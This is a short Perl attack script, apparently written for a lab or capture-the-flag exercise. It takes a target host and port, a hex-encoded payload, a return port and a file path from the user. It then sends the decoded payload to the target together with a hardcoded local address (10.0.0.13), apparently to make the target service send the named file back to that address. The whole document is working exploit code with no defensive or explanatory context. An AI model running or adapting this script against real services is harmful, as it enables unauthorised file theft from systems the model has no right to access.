#!/usr/bin/env perl

use strict;
use warnings;

use IO::Socket;
use Sys::Hostname;

my $my_addr    = '10.0.0.13'; #inet_ntoa((gethostbyname(hostname))[4]);

print "target\n";
my $target = <STDIN>;
chomp $target;

print "flag (in hex)\n";
my $flag = <STDIN>;
chomp $flag;

print "target port\n";
my $tport = <STDIN>;
chomp $tport;

print "return port\n";
my $rport = <STDIN>;
chomp $rport;

print "file\n";
my $file = <STDIN>;
chomp $file;

#print "$target $tport\n";

my $sock = IO::Socket::INET->new(
    PeerAddr => $target,
    PeerPort => $tport,
    Proto    => 'tcp'
) or die "socket: $!";

my $exploit = pack ('H*', $flag);

#print  "$exploit:1:$my_addr:$rport::$file\n";
print $sock "$exploit:1:$my_addr:$rport::$file\n";
